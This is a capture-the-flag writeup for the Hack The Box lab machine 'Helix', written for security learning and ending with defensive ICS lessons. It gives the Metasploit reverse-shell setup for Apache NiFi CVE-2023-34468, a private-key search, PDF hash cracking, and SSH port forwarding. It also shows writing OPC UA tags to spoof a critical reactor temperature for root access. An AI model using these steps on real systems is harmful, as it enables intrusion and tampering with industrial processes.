---
title: "HTB Helix Writeup: From Apache NiFi RCE to ICS OPC UA Manipulation"
title_post: "HTB Helix Writeup: From Apache NiFi RCE to ICS OPC UA Manipulation"
date: 2026-08-20 00:00:00 +0500
categories:
  - HTB
  - Linux
  - Medium
tags:
  - htb
  - linux
  - medium
  - ics
  - scada
  - apache-nifi
  - cve-2023-34468
  - privilege-escalation
  - vhost-enumeration
  - password-cracking

description: HTB Helix writeup covering VHost discovery, Apache NiFi RCE, SSH key exposure, PDF password cracking, OPC UA tag manipulation, and privilege escalation through an ICS maintenance window.
image:
  path: /assets/img/writeups/helix/banner.png
  alt: HTB Helix Writeup
---

## 1. Machine Information

| Machine | Retro |
|---------|-------|
| Platform | [Hack The Box](https://www.hackthebox.com/) |
| OS | Linux (Ubuntu) |
| Difficulty | Medium |
| Theme | ICS / SCADA |
| Initial Access | VHost Enumeration + CVE-2023-34468 |
| Privilege Escalation | OPC UA Tag Manipulation + Sudo Maintenance Script |
| Final Access | Root |

## 2. Attack Path

```
Nmap → VHost Enumeration
        ↓
flow.helix.htb
        ↓
Apache NiFi
        ↓
NiFi Processor RCE
        ↓
nifi Foothold
        ↓
SSH Private Key Disclosure
        ↓
operator
        │
        ├── Internal HMI :8081
        │
        └── OPC UA :4840
                    ↓
             OPC UA Tag Enumeration
                    ↓
          Maintenance Mode
                    ↓
             TestOverride
                    ↓
           CalibrationOffset
                    ↓
       Critical Temperature State
                    ↓
      Emergency Maintenance Window
                    ↓
            Sudo Maintenance
                    ↓
                  ROOT
```

## 3. Reconnaissance

### 3.1 Service Enumeration

I started with a service and version scan:

```bash
┌─[r00trec00n@parrot]─[~]
└──╼ $nmap -sC -sV -v 10.129.245.123
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://helix.htb/
```

The web server redirected to `helix.htb`, so I added the hostname to `/etc/hosts` and continued with web enumeration.

![helix-web](/assets/img/writeups/helix/helix-web.png)
_Main Helix web interface_

The main web interface exposed only the static application and did not provide an immediate attack path.

### 3.2 Virtual Host Enumeration

Since the main site did not reveal an obvious foothold, I fuzzed for virtual hosts using `ffuf`:

```bash
┌─[r00trec00n@parrot]─[~/Desktop/htb/machines/linux/helix]
└──╼ $ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://helix.htb -H "Host: FUZZ.helix.htb" -c -fs 154
flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 912ms]
```

This revealed `flow.helix.htb`, which I added to `/etc/hosts`.

### 3.3 Apache NiFi Enumeration

Visiting `flow.helix.htb` exposed an Apache NiFi interface that was accessible without authentication.

![nifi](/assets/img/writeups/helix/nifi.png)
_Apache NiFi interface exposed on the discovered virtual host_

The NiFi canvas was anonymously accessible, providing direct access to the application's workflow interface.

I checked the **About** section to identify the exact NiFi version.

![nifi-version](/assets/img/writeups/helix/nifi-version.png)
_Apache NiFi version identified from the About section._

Identifying the exact NiFi version allowed me to check for known vulnerabilities affecting the deployed release.

## 4. Initial Access

### 4.1 Apache NiFi RCE — CVE-2023-34468

The identified version was affected by **CVE-2023-34468**, a vulnerability that can lead to remote code execution through NiFi connection pool controller services.

![nifi-cve](/assets/img/writeups/helix/nifi-cve.png)
_CVE-2023-34468 affecting the identified NiFi version_

The vulnerability information confirmed that the exposed NiFi version had a known RCE path.

I tried several public PoCs, but they did not work in this environment. I then tested the Metasploit module:

`exploit/multi/http/apache_nifi_processor_rce`

![msfconsole](/assets/img/writeups/helix/msfconsole.png)
_Metasploit search result_

Metasploit provided a working exploitation path for the NiFi instance.

I configured the module as follows:

```bash
use exploit/multi/http/apache_nifi_processor_rce
set RHOSTS flow.helix.htb
set RPORT 80
set TARGETURI /
set VHOST flow.helix.htb
set SSL false
set LHOST tun0
set LPORT 4444
run
```

The exploit provided a shell as the `nifi` user.

## 5. Lateral Movement

### 5.1 Finding an SSH Private Key

As `nifi`, I searched common application directories for files containing private-key material:

```bash
nifi@helix:/opt/nifi-1.21.0$ find /opt /etc /var -type f -readable -size +100c -size -10M -exec grep -Irl "BEGIN.*PRIVATE KEY" {} + 2>/dev/null
/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
/opt/nifi-1.21.0/docs/html/toolkit-guide.html
/var/lib/fwupd/pki/secret.key
```

The following file immediately stood out:

`/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak`

Reading it revealed an Ed25519 private key belonging to the `operator` account.

```bash
nifi@helix:/opt/nifi-1.21.0$ cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
...[SNIP]...
-----END OPENSSH PRIVATE KEY-----
```

The exposed key allowed me to authenticate as `operator`.

### 5.2 Operator Access

After copying the key to my machine and setting the required permissions, I connected over SSH:

```bash
┌─[r00trec00n@parrot]─[~/Desktop/htb/machines/linux/helix]
└──╼ $ssh -o PubkeyAcceptedKeyTypes=+ssh-ed25519 -i id_rsa_operator operator@10.129.245.123
operator@helix:~$ cat user.txt
<REDACTED>
```

This gave me the user flag.

## 6. Understanding the ICS Environment

### 6.1 Operator Documentation

While enumerating the `operator` home directory, I found ICS-related documentation. I downloaded the files for offline analysis:

```bash
┌─[r00trec00n@parrot]─[~/Desktop/htb/machines/linux/helix]
└──╼ $scp -i id_rsa_operator operator@helix.htb:'Operator Control & Safety Guide.pdf' .

┌─[r00trec00n@parrot]─[~/Desktop/htb/machines/linux/helix]
└──╼ $scp -i id_rsa_operator operator@helix.htb:'control systems diagram.png' .
```

![control systems diagram](/assets/img/writeups/helix/control%20systems%20diagram.png)
_ICS control-system architecture showing the internal OPC UA service_

The control-system diagram showed an internal OPC UA service running on port `4840` with the `/helix` endpoint.

The PDF was password protected, so I extracted the PDF hash using `pdf2john` and attempted to crack it with Hashcat.

```bash
pdf2john "Operator Control & Safety Guide.pdf" > hash
```

```bash
┌─[✗]─[r00trec00n@parrot]─[~/Desktop/htb/machines/linux/helix]
└──╼ $hashcat -m 10700 hash /usr/share/wordlists/rockyou.txt
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10700 (PDF 1.7 Level 8 (Acrobat 10 - 11))
Candidates.#1....: orange85 -> online123
...[SNIP]...
pdf$5*6*256*-4*1*16*7c46c5fed97042269c802d39f7ba411b*48*a3bf8039a5f2a39d85b611b374b74debe6be3aa6f01dc1a6e8dd5cd4157499f9a3efe04ca0c999bcac23d7efd22e8366*48*c8909cc91d0fa3d97bf1ce139c46df1936b2b9dc15a305a659d5eb2b1c3172da04ddf8efbfea0a98b3e5043e883ab3e7*32*d3e8e21436f4263214102eebcf3a51d2a4e5049fc2e2aaf50e594ce952db7011*32*a3b05cab12d5403fb8e96415a023560c9453cea981ddbb72d92650c0933785b5:operator1
```

The recovered password was `operator1`.

The documentation explained the maintenance logic and sensor tolerances used by the ICS environment.

![maintenance-mode](/assets/img/writeups/helix/maintenance-mode.png)
_Maintenance mode requirements from the operator documentation_

The documentation described the maintenance mode and the conditions required to activate it.

![maintenance-operation-window](/assets/img/writeups/helix/maintenance-operation-window.png)
_Maintenance-operation window logic_

The maintenance-window documentation provided the information needed to understand the privilege-escalation path.

## 7. Privilege Escalation

### 7.1 Sudo Maintenance Console

I first checked the available sudo privileges:

```bash
operator@helix:~$ sudo -l
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console

operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
Maintenance window CLOSED.
```

The `operator` account could execute `/usr/local/sbin/helix-maint-console` as root without a password. However, the script required an active maintenance window.

The next step was therefore to determine how the maintenance window was triggered.

### 7.2 Internal Services and Port Forwarding

I enumerated locally listening services:

```bash
operator@helix:~$ ss -tnl
State          Recv-Q         Send-Q                  Local Address:Port                  Peer Address:Port        Process
LISTEN         0              50                         127.0.0.1:41969                    0.0.0.0:*
LISTEN         0              100                        127.0.0.1:4840                     0.0.0.0:*
LISTEN         0              4096                       127.0.0.53%lo:53                   0.0.0.0:*
LISTEN         0              50                         127.0.0.1:8080                     0.0.0.0:*
LISTEN         0              128                        127.0.0.1:8081                     0.0.0.0:*
LISTEN         0              128                        0.0.0.0:22                         0.0.0.0:*
LISTEN         0              511                        0.0.0.0:80                         0.0.0.0:*
LISTEN         0              128                        [::]:22                            [::]:*
LISTEN         0              50                         [::ffff:127.0.0.1]:38101
```

Port `4840` indicated an internal OPC UA service, while `8081` appeared to host the internal HMI.

I forwarded both ports to my local machine through SSH:

```bash
┌─[✗]─[r00trec00n@parrot]─[~/Desktop/htb/machines/linux/helix]
└──╼ $ssh -o PubkeyAcceptedKeyTypes=+ssh-ed25519 -i id_rsa_operator operator@helix.htb -L 4840:127.0.0.1:4840 -L 8081:127.0.0.1:8081
```

The HMI showed how the backend controller monitored the reactor temperature.

![HMI](/assets/img/writeups/helix/HMI.png)
_Internal HMI displaying the reactor status_

The HMI exposed the reactor variables and provided insight into the conditions that controlled the maintenance window.

The documentation and HMI showed that a dangerous temperature threshold would cause the controller to open a temporary maintenance window.

Because the controller relied on values exposed through OPC UA, the next step was to investigate whether those values could be modified.

### 7.3 OPC UA Enumeration and Tag Manipulation

I used the FreeOpcUa client GUI to interact with the internal OPC UA server:

```bash
git clone https://github.com/FreeOpcUa/opcua-client-gui.git
uv sync
uv run python app.py
```

![OPCUA Client](/assets/img/writeups/helix/opca-client.png)
_OPC UA client connected to the internal server_

The OPC UA client connected to the forwarded service and allowed the server's node tree to be browsed.

The server requested authentication, so I tested the previously recovered PDF password against the OPC UA service:

- Username: `operator`
- Password: `operator1`

I connected to:

`opc.tcp://127.0.0.1:4840/helix`

The node tree contained several writable variables, including:

- `MAINTENANCE`
- `TestOverride`
- `CalibrationOffset`

Based on the information gathered from the HMI and operator documentation, these variables had to be manipulated in a specific sequence to trigger the maintenance window. I first enabled `MAINTENANCE`, then enabled `TestOverride` to allow manual calibration changes, and finally modified `CalibrationOffset` to raise the reported temperature to 295°C, placing it within the critical range.

I first enabled maintenance mode.

![Maintenance](/assets/img/writeups/helix/set-maintenance.png)
_Enabling the MAINTENANCE tag_

The `MAINTENANCE` tag was changed to enable the maintenance state.

Next, I enabled `TestOverride` so that manual calibration changes would be accepted.

![TestOverride](/assets/img/writeups/helix/set-testoverride.png)
_Enabling the TestOverride tag_

`TestOverride` was set to `True`, allowing the calibration value to be manipulated.

Finally, I modified `CalibrationOffset` to push the reported temperature into the critical range.

![CallibrationOffset](/assets/img/writeups/helix/set-callibrationoffset.png)
_Modifying the CalibrationOffset value_

The calibration offset increased the reported temperature into the threshold used by the backend controller.

I then checked the resulting system state:

![Check Status](/assets/img/writeups/helix/check-for-status.png)
_System status after manipulating the reactor temperature_

The manipulated sensor value caused the controller to recognize the critical condition and open the maintenance window.

### 7.4 Root Shell

With the maintenance window active, I immediately executed the sudo maintenance console again:

```bash
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
[+] Privileged maintenance access granted
[!] Window expires in 93 seconds
[!] Session will be terminated automatically
root@helix:/home/operator# cat /root/root.txt
<REDACTED>
```

The maintenance check passed and the script provided a root shell.

The privilege escalation therefore depended on the interaction between the OPC UA-controlled system state and the privileged maintenance console.

## 8. Conclusion

Helix stands out because the final privilege escalation requires more than traditional Linux enumeration.

The initial stages follow a familiar penetration-testing workflow:

```
Reconnaissance
    ↓
VHost Enumeration
    ↓
Application Enumeration
    ↓
NiFi RCE
    ↓
Credential / Key Discovery
    ↓
User Pivot
```

The final stage, however, requires understanding the relationship between an industrial process and the software controlling it:

```
OPC UA Access
    ↓
Writable Process Variables
    ↓
Manipulated Sensor State
    ↓
Controller Logic
    ↓
Emergency Maintenance Window
    ↓
Privileged Maintenance Console
    ↓
ROOT
```

What makes this attack chain particularly interesting is that the root shell was not obtained through a typical Linux privilege-escalation misconfiguration. Instead, the attacker influenced the **industrial process state** until the controller itself created the condition required for privileged maintenance access.

The key OT security lesson is simple:

> **Process data must not automatically be trusted just because it originates from an internal industrial protocol.**

If an attacker can manipulate a variable such as a calibration offset or test override, and that variable influences safety-critical or administrative decisions, the impact can extend far beyond the protocol itself.

Helix demonstrates how a vulnerability at the intersection of **IT security, application security, and industrial control logic** can ultimately become an operating-system-level compromise.


## 9. Key Takeaways

### Offensive Security

- **VHost Enumeration:** The primary website was not the only web attack surface. Virtual host enumeration exposed `flow.helix.htb`.
- **Version Enumeration:** Identifying the exact Apache NiFi version helped map the service to a known vulnerability.
- **Exploit Validation:** Public PoCs may not always work as expected. Understanding the vulnerability and having alternative exploitation methods is important.
- **Sensitive File Discovery:** Application support bundles can contain credentials, private keys, and other sensitive information.
- **Internal Service Enumeration:** Services bound to `127.0.0.1` can expose completely different attack surfaces once accessed through SSH tunneling.
- **Credential Reuse:** A password recovered from an operational document was also useful for authenticating to the OPC UA service.

### OT / ICS Security

- **Protect Industrial Protocols:** Internal OPC UA services should not be assumed trustworthy simply because they are not internet-facing.
- **Restrict Write Access:** Process variables such as calibration and override values should have tightly controlled write permissions.
- **Authenticate and Authorize OPC UA Clients:** Authentication alone is not enough if authenticated users can modify safety-critical variables without appropriate authorization.
- **Validate Safety-Critical Inputs:** Sensor values and process variables should be validated before they influence safety or administrative decisions.
- **Separate Control Logic from Privileged Access:** A process condition generated from an externally writable OPC UA variable should not directly determine whether a privileged operating-system function becomes available.
- **Protect Test and Maintenance Modes:** Test overrides and maintenance states are powerful operational controls and require strong authorization.
- **Avoid Trusting a Single State Flag:** Privileged maintenance functions should not rely solely on a state flag that can ultimately be influenced through the industrial control interface.